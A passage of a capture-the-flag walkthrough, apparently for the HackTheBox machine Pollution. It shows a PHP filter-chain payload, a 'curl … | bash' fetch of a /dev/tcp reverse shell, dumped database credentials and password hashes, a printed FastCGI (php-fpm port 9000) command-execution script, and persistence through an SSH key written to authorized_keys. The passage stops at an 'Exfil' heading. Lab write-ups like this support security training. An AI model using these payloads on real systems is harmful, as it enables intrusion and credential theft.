se64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+</span></code></pre></div></div>
+<p>I’ll need to add <code class="language-plaintext highlighter-rouge">0=id</code> to the URL GET parameters and it will execute <code class="language-plaintext highlighter-rouge">id</code>:</p>
+<picture>
+<source srcset="/img/image-20230628174159373.webp" type="image/webp"/>
+<img alt="image-20230628174159373" class="include_image" loading="lazy" src="/img/image-20230628174159373.png"/>
+</picture>
+<p>I’ll replace <code class="language-plaintext highlighter-rouge">id</code> with <code class="language-plaintext highlighter-rouge">curl 10.10.14.6/s|bash</code>:</p>
+<picture>
+<source srcset="/img/image-20230628174501412.webp" type="image/webp"/>
+<img alt="image-20230628174501412" class="include_image" loading="lazy" src="/img/image-20230628174501412.png"/>
+</picture>
+<p>It hits my server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.192 - - [27/Jun/2023 20:31:03] code 404, message File not found
+10.10.11.192 - - [27/Jun/2023 20:31:03] "GET /s HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<p>I’ll create <code class="language-plaintext highlighter-rouge">s</code> in my web directory:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1
+</code></pre></div></div>
+<p>And refresh Firefox. It gets <code class="language-plaintext highlighter-rouge">s</code> and then there’s a reverse shell at my <code class="language-plaintext highlighter-rouge">nc</code> listener:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.192 39034
+bash: cannot set terminal process group (974): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@pollution:~/developers$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll use the <code class="language-plaintext highlighter-rouge">script</code> / <code class="language-plaintext highlighter-rouge">stty</code> <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">trick</a> to upgrade my shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pollution:~/developers$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="gp">www-data@pollution:~/developers$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lvnp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lvnp 443
+            reset
+reset: unknown terminal type unknown 
+Terminal type? screen
+</span><span class="gp">www-data@pollution:~/developers$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-victor">Shell as victor</h2>
+<h3 id="enumeration-2">Enumeration</h3>
+<h4 id="home-directories">Home Directories</h4>
+<p>There’s only one user with a directory in <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pollution:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">victor
+</span><span class="gp">www-data@pollution:/home$</span><span class="w"> </span><span class="nb">cd </span>victor/
+<span class="go">bash: cd: victor/: Permission denied
+</span></code></pre></div></div>
+<h4 id="web">Web</h4>
+<p>All three sites connect o MySQL using the credentials webapp_user / Str0ngP4ssw0rdB*12@1:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">collect</code> - <code class="language-plaintext highlighter-rouge">config.php</code> has creds for db named <code class="language-plaintext highlighter-rouge">webapp</code></li>
+<li><code class="language-plaintext highlighter-rouge">developers</code>  - <code class="language-plaintext highlighter-rouge">login.php</code> has creds for db named <code class="language-plaintext highlighter-rouge">developers</code></li>
+<li><code class="language-plaintext highlighter-rouge">forum</code> - <code class="language-plaintext highlighter-rouge">inc/config.php</code> has creds for db named <code class="language-plaintext highlighter-rouge">forum</code></li>
+</ul>
+<p>I’ll take a look through these DBs, but there’s not much of interest. Both <code class="language-plaintext highlighter-rouge">webapp</code> and <code class="language-plaintext highlighter-rouge">developers</code> have a <code class="language-plaintext highlighter-rouge">users</code> table with an admin user with the hash c89efc49ddc58ee4781b02becc788d14. I can tell from my own hash in that table that these are unsalted MD5 hashes. But this hash doesn’t crack to anything.</p>
+<p>There are seven other users in the <code class="language-plaintext highlighter-rouge">mybb_users</code> table in <code class="language-plaintext highlighter-rouge">forum</code>. It’s using some kind of salted MD5.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [forum]&gt;</span><span class="w"> </span><span class="k">select</span> <span class="n">uid</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="n">salt</span> <span class="k">from</span> <span class="n">mybb_users</span><span class="p">;</span> 
+<span class="go">+-----+---------------------+----------------------------------+----------+
+| uid | username            | password                         | salt     |
++-----+---------------------+----------------------------------+----------+
+|   1 | administrator_forum | b254efc2c5716af2089ffeba1abcbf30 | DFFbL50R |
+|   2 | john                | e1ec52d73242b78fdee6be117569b602 | UsWOsbCe |
+|   3 | victor              | b454fd07d44b27f1d528efba841c9717 | Guls6xA8 |
+|   4 | sysadmin            | 477a429cddfc475b9100958cae9204b1 | 3aUhiPN0 |
+|   5 | jeorge              | 5d13d9d4b1f368280b8426800a85702e | 7HINOv17 |
+|   8 | lyon                | 5eab3ec757f8352597ab74361fda8bcc | glx7Hpzh |
+|   6 | jane                | 972470c4c1a3f53029e56007abcf39fc | YGjmCmvg |
+|   7 | karldev             | 285127d01d188c8827c9fded33bf6f9e | KUWyAcfh |
+|   9 | 0xdf                | 2d80c111e62a29b9dcc0104b3e06df15 | 0m9qY5r2 |
++-----+---------------------+----------------------------------+----------+
+9 rows in set (0.001 sec)
+</span></code></pre></div></div>
+<p>I’ll go down a bit of a rabbit hole to figure out that these hashes are of the form <code class="language-plaintext highlighter-rouge">md5(md5([salt]).md5([password]))</code>. This is actually <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">mode 2811</a> in Hashcat, but none of these crack (creating a user with password “password”, dumping the hash and salt, and running that through <code class="language-plaintext highlighter-rouge">hashcat</code> verifies this works).</p>
+<p>There is one other DB of interest, <code class="language-plaintext highlighter-rouge">pollution_api</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [forum]&gt;</span><span class="w"> </span><span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
+<span class="go">+--------------------+
+| Database           |
++--------------------+
+| developers         |
+| forum              |
+| information_schema |
+| mysql              |
+| performance_schema |
+| pollution_api      |
+| webapp             |
++--------------------+
+7 rows in set (0.001 sec)
+</span></code></pre></div></div>
+<p>It has two tables. <code class="language-plaintext highlighter-rouge">messages</code> is empty, and <code class="language-plaintext highlighter-rouge">users</code> has only the user I created by the admin on the webpage while doing XXE:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">MariaDB [forum]&gt;</span><span class="w"> </span><span class="n">use</span> <span class="n">pollution_api</span>
+<span class="go">Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+</span><span class="gp">MariaDB [pollution_api]&gt;</span><span class="w"> </span><span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
+<span class="go">+-------------------------+
+| Tables_in_pollution_api |
++-------------------------+
+| messages                |
+| users                   |
++-------------------------+
+2 rows in set (0.001 sec)
+
+</span><span class="gp">MariaDB [pollution_api]&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">messagesl</span><span class="p">;</span>
+<span class="go">ERROR 1146 (42S02): Table 'pollution_api.messagesl' doesn't exist
+</span><span class="gp">MariaDB [pollution_api]&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">messages</span><span class="p">;</span> 
+<span class="go">Empty set (0.001 sec)
+
+</span><span class="gp">MariaDB [pollution_api]&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>   
+<span class="go">+----+----------+----------+------+---------------------+---------------------+
+| id | username | password | role | createdAt           | updatedAt           |
++----+----------+----------+------+---------------------+---------------------+
+|  1 | 0xdf     | 0xdf     | user | 2023-06-28 19:44:06 | 2023-06-28 19:44:06 |
++----+----------+----------+------+---------------------+---------------------+
+1 row in set (0.000 sec)
+</span></code></pre></div></div>
+<h4 id="victors-php-fpm">victor’s php-fpm</h4>
+<p>Looking at the process list, there are only two processes running as victor:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">victor      1100  0.0  0.3 265840 15712 ?        S    Jun27   0:00 php-fpm: pool victor
+victor      1103  0.0  0.3 265840 15712 ?        S    Jun27   0:00 php-fpm: pool victor
+</span></code></pre></div></div>
+<p>There’s a master fpm process that gives the config location:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pollution:~$</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>fpm                                         
+<span class="go">root         974  0.0  1.0 265400 40936 ?        Ss   Jun27   0:14 php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)
+victor      1100  0.0  0.3 265840 15712 ?        S    Jun27   0:00 php-fpm: pool victor
+victor      1103  0.0  0.3 265840 15712 ?        S    Jun27   0:00 php-fpm: pool victor
+www-data    7735  0.0  0.8 345248 34156 ?        S    Jun28   0:00 php-fpm: pool www
+www-data    7736  0.0  0.8 344700 34628 ?        S    Jun28   0:00 php-fpm: pool www
+www-data    7737  0.0  0.8 344424 34140 ?        S    Jun28   0:00 php-fpm: pool www
+www-data   11119  0.0  0.7 266276 29216 ?        S    02:29   0:00 php-fpm: pool www
+www-data   11251  0.0  0.7 265968 28468 ?        S    02:39   0:00 php-fpm: pool www
+</span></code></pre></div></div>
+<p>That files shows two configurations, one as victor and one as www-data:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pollution:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/php/8.1/fpm/pool.d/www.conf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'^;'</span> | <span class="nb">grep</span> <span class="nb">.</span>
+<span class="go">[victor]
+user = victor
+group = victor
+listen = 127.0.0.1:9000
+listen.owner = www-data
+listen.group = www-data
+pm = dynamic
+pm.max_children = 5
+pm.start_servers = 2
+pm.min_spare_servers = 1
+pm.max_spare_servers = 3
+[www]
+user = www-data
+group = www-data
+listen = /run/php/php8.1-fpm.sock
+listen.owner = www-data
+listen.group = www-data
+pm = dynamic
+pm.max_children = 5
+pm.start_servers = 2
+pm.min_spare_servers = 1
+pm.max_spare_servers = 3
+</span></code></pre></div></div>
+<p>The victor one is listening on port 9000.</p>
+<h3 id="fpm">FPM</h3>
+<h4 id="background-1">Background</h4>
+<p>FPM is the FastCGI Process Manager. FastCGI is a protocol implementation like CGI (Common Gateway Interface), designed to connect web requests to executables / scripts.</p>
+<p>It isn’t clear what legit purpose victor has for running fpm. I don’t see a scripts directory or anything available on 9000.</p>
+<h4 id="poc-1">POC</h4>
+<p>HackTricks has a nice page on <a href="https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi?ref=hacktrickz.xyz">Pentesting FastCGI</a>. It gives the following script, as well as a link to <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">this Python script</a>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">PAYLOAD</span><span class="o">=</span><span class="s2">"&lt;?php echo '&lt;!--'; system('whoami'); echo '--&gt;';"</span>
+<span class="nv">FILENAMES</span><span class="o">=</span><span class="s2">"/var/www/public/index.php"</span> <span class="c"># Existing file path</span>
+
+<span class="nv">HOST</span><span class="o">=</span><span class="nv">$1</span>
+<span class="nv">B64</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$PAYLOAD</span><span class="s2">"</span>|base64<span class="si">)</span>
+
+<span class="k">for </span>FN <span class="k">in</span> <span class="nv">$FILENAMES</span><span class="p">;</span> <span class="k">do
+    </span><span class="nv">OUTPUT</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>
+    <span class="nb">env</span> <span class="nt">-i</span> <span class="se">\</span>
+      <span class="nv">PHP_VALUE</span><span class="o">=</span><span class="s2">"allow_url_include=1"</span><span class="s1">$'</span><span class="se">\n</span><span class="s1">'</span><span class="s2">"allow_url_fopen=1"</span><span class="s1">$'</span><span class="se">\n</span><span class="s1">'</span><span class="s2">"auto_prepend_file='data://text/plain</span><span class="se">\;</span><span class="s2">base64,</span><span class="nv">$B64</span><span class="s2">'"</span> <span class="se">\</span>
+      <span class="nv">SCRIPT_FILENAME</span><span class="o">=</span><span class="nv">$FN</span> <span class="nv">SCRIPT_NAME</span><span class="o">=</span><span class="nv">$FN</span> <span class="nv">REQUEST_METHOD</span><span class="o">=</span>POST <span class="se">\</span>
+      cgi-fcgi <span class="nt">-bind</span> <span class="nt">-connect</span> <span class="nv">$HOST</span>:9000 &amp;&gt; <span class="nv">$OUTPUT</span>
+
+    <span class="nb">cat</span> <span class="nv">$OUTPUT</span>
+<span class="k">done</span>
+</code></pre></div></div>
+<p>I’ll copy the shell script to Pollution as <code class="language-plaintext highlighter-rouge">/dev/shm/ex.sh</code>. I need to change the <code class="language-plaintext highlighter-rouge">FILENAMES</code> variable to something that exists. I’ll use <code class="language-plaintext highlighter-rouge">/var/www/developers/index.php</code>. I’ll also change <code class="language-plaintext highlighter-rouge">whoami</code> to <code class="language-plaintext highlighter-rouge">id</code> because I think the output is more obvious.</p>
+<p>With no other changes, I’ll run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pollution:/dev/shm$</span><span class="w"> </span>bash ex.sh localhost
+<span class="go">Status: 302 Found
+Set-Cookie: PHPSESSID=n4ocmpe5i6na46bgdlm8g4h929; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /login.php
+Content-type: text/html; charset=UTF-8
+
+&lt;!--uid=1002(victor) gid=1002(victor) groups=1002(victor)
+--&gt;
+</span></code></pre></div></div>
+<p>It returns the output of <code class="language-plaintext highlighter-rouge">id</code> as victor!</p>
+<h4 id="update-script">Update Script</h4>
+<p>I’ll update the script to always go for localhost, and use the first argument as the command to run:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">PAYLOAD</span><span class="o">=</span><span class="s2">"&lt;?php echo '&lt;!--'; system(</span><span class="se">\"</span><span class="nv">$1</span><span class="se">\"</span><span class="s2">); echo '--&gt;' . </span><span class="se">\"\n\"</span><span class="s2">;"</span>
+<span class="nv">FILENAMES</span><span class="o">=</span><span class="s2">"/var/www/developers/index.php"</span> <span class="c"># Existing file path</span>
+
+<span class="nv">HOST</span><span class="o">=</span><span class="s2">"localhost"</span>
+<span class="nv">B64</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$PAYLOAD</span><span class="s2">"</span>|base64<span class="si">)</span>
+
+<span class="k">for </span>FN <span class="k">in</span> <span class="nv">$FILENAMES</span><span class="p">;</span> <span class="k">do
+    </span><span class="nv">OUTPUT</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>
+    <span class="nb">env</span> <span class="nt">-i</span> <span class="se">\</span>
+      <span class="nv">PHP_VALUE</span><span class="o">=</span><span class="s2">"allow_url_include=1"</span><span class="s1">$'</span><span class="se">\n</span><span class="s1">'</span><span class="s2">"allow_url_fopen=1"</span><span class="s1">$'</span><span class="se">\n</span><span class="s1">'</span><span class="s2">"auto_prepend_file='data://text/plain</span><span class="se">\;</span><span class="s2">base64,</span><span class="nv">$B64</span><span class="s2">'"</span> <span class="se">\</span>
+      <span class="nv">SCRIPT_FILENAME</span><span class="o">=</span><span class="nv">$FN</span> <span class="nv">SCRIPT_NAME</span><span class="o">=</span><span class="nv">$FN</span> <span class="nv">REQUEST_METHOD</span><span class="o">=</span>POST <span class="se">\</span>
+      cgi-fcgi <span class="nt">-bind</span> <span class="nt">-connect</span> <span class="nv">$HOST</span>:9000 &amp;&gt; <span class="nv">$OUTPUT</span>
+
+    <span class="nb">cat</span> <span class="nv">$OUTPUT</span>
+<span class="k">done</span>
+</code></pre></div></div>
+<p>I’ll have to change the speechmarks around a bit to allow for <code class="language-plaintext highlighter-rouge">$1</code> to be processed as a variable. I’ll also add a trailing newline in the output. It works, reading victor’s home directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pollution:/dev/shm$</span><span class="w"> </span>bash ex.sh <span class="s2">"ls -la ~"</span> 
+<span class="go">Status: 302 Found
+Set-Cookie: PHPSESSID=uul95tosrmr8ktqlo99gq23a7r; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /login.php
+Content-type: text/html; charset=UTF-8
+
+&lt;!--total 80
+drwx------ 16 victor victor 4096 Jun 28 15:51 .
+drwxr-xr-x  3 root   root   4096 Nov 21  2022 ..
+lrwxrwxrwx  1 victor victor    9 Nov 21  2022 .bash_history -&gt; /dev/null
+-rw-r--r--  1 victor victor 3526 Mar 27  2022 .bashrc
+drwxr-xr-x 12 victor victor 4096 Nov 21  2022 .cache
+drwx------ 11 victor victor 4096 Nov 21  2022 .config
+drwx------  2 victor victor 4096 Dec  5  2022 .gnupg
+drwxr-xr-x  3 victor victor 4096 Nov 21  2022 .local
+-rw-r--r--  1 victor victor  807 Mar 27  2022 .profile
+-rw-------  1 victor victor    9 Jun 28 15:51 .python_history
+lrwxrwxrwx  1 root   root      9 Oct 27  2022 .rediscli_history -&gt; /dev/null
+drwx------  2 victor victor 4096 Nov 21  2022 .ssh
+drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Desktop
+drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Documents
+drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Downloads
+drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Music
+drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Pictures
+drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Public
+drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Templates
+drwxr-xr-x  2 victor victor 4096 Nov 21  2022 Videos
+drwxr-xr-x  8 victor victor 4096 Nov 21  2022 pollution_api
+-rw-r-----  1 root   victor   33 Jun 27 18:37 user.txt
+--&gt;
+</span></code></pre></div></div>
+<h4 id="write-ssh-key">Write SSH Key</h4>
+<p>Given the access to victor, I’ll write my SSH public key into <code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code>. The file doesn’t exist right now, so I don’t have to worry about overwriting anything:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pollution:/dev/shm$</span><span class="w"> </span>bash ex.sh <span class="s2">"ls -la ~/.ssh"</span>
+<span class="go">Status: 302 Found
+Set-Cookie: PHPSESSID=kjhk4o415osmifepdfecj8q1ar; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /login.php
+Content-type: text/html; charset=UTF-8
+
+&lt;!--total 8
+drwx------  2 victor victor 4096 Nov 21  2022 .
+drwx------ 16 victor victor 4096 Jun 28 15:51 ..
+--&gt;
+</span></code></pre></div></div>
+<p>I’ll write my key, and it seems to work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@pollution:/dev/shm$</span><span class="w"> </span>bash ex.sh <span class="s2">"echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' &gt; ~/.ssh/authorized_keys"</span>
+<span class="go">Status: 302 Found
+Set-Cookie: PHPSESSID=7ogec5iiqta7kpgdsffllfmq09; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /login.php
+Content-type: text/html; charset=UTF-8
+
+&lt;!----&gt;
+</span><span class="gp">www-data@pollution:/dev/shm$</span><span class="w"> </span>bash ex.sh <span class="s2">"ls -la ~/.ssh"</span>                                                                                                                  
+<span class="go">Status: 302 Found
+Set-Cookie: PHPSESSID=l9pud93ittdogopgihh659v8p3; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /login.php
+Content-type: text/html; charset=UTF-8
+
+&lt;!--total 12
+drwx------  2 victor victor 4096 Jun 29 03:20 .
+drwx------ 16 victor victor 4096 Jun 28 15:51 ..
+-rw-r--r--  1 victor victor   96 Jun 29 03:20 authorized_keys
+--&gt;
+</span></code></pre></div></div>
+<h3 id="ssh">SSH</h3>
+<p>With my public key in <code class="language-plaintext highlighter-rouge">authorized_keys</code>, I can connect over SSH:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen victor@collect.htb
+<span class="go">Linux pollution 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+...[snip]...
+</span><span class="gp">victor@pollution:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>And fetch <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victor@pollution:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">1352844a************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration---pollution_api">Enumeration - pollution_api</h3>
+<p>In victor’s home directory there is a folder named <code class="language-plaintext highlighter-rouge">pollution_api</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victor@pollution:~$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">Desktop  Documents  Downloads  Music  Pictures  pollution_api  Public  Templates  user.txt  Video
+</span></code></pre></div></div>
+<p>It contains a NodeJS application:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victor@pollution:~/pollution_api$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">controllers  functions  index.js  logs  log.sh  models  node_modules  package.json  package-lock.json  routes
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">index.js</code> shows it uses the <a href="https://expressjs.com/">Express framework</a>, and is listening on port 3000:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
+<span class="kd">const</span> <span class="nx">bodyParser</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">body-parser</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nf">json</span><span class="p">());</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">Status</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Ok</span><span class="dl">"</span><span class="p">,</span> <span class="na">Message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Read documentation from api in /documentation</span><span class="dl">'</span><span class="p">});</span>
+<span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/auth</span><span class="dl">'</span><span class="p">,</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes/auth</span><span class="dl">'</span><span class="p">));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/client</span><span class="dl">'</span><span class="p">,</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes/client</span><span class="dl">'</span><span class="p">));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/admin</span><span class="dl">'</span><span class="p">,</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes/admin</span><span class="dl">'</span><span class="p">));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/documentation</span><span class="dl">'</span><span class="p">,</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes/documentation</span><span class="dl">'</span><span class="p">));</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="dl">'</span><span class="s1">127.0.0.1</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Listen on http://localhost:3000</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+<p>It has a default message for <code class="language-plaintext highlighter-rouge">/</code> which talks about <code class="language-plaintext highlighter-rouge">/documentation</code>, and it imports routes from four other directories.</p>
+<p>The application is running:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victor@pollution:~/pollution_api$</span><span class="w"> </span>curl localhost:3000
+<span class="go">{"Status":"Ok","Message":"Read documentation from api in /documentation"}
+</span></code></pre></div></div>
+<p>In fact, it’s running as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">victor@pollution:~/pollution_api$</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>node
+<span class="go">root        1346  0.0  2.0 1680660 80304 ?       Sl   Jun27   0:01 /usr/bin/node /root/pollution_api/index.js
+</span></code></pre></div></div>
+<p>I’ll also reconnect my SSH session with <code class="language-plaintext highlighter-rouge">-L 3000:localhost:3000</code> so that 3000 on my VM now accesses this new API:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl localhost:3000
+<span class="go">{"Status":"Ok","Message":"Read documentation from api in /documentation"}
+</span></code></pre></div></div>
+<h3 id="source-code-analysis">Source Code Analysis</h3>
+<h4 id="exfil">Exfil</h4>
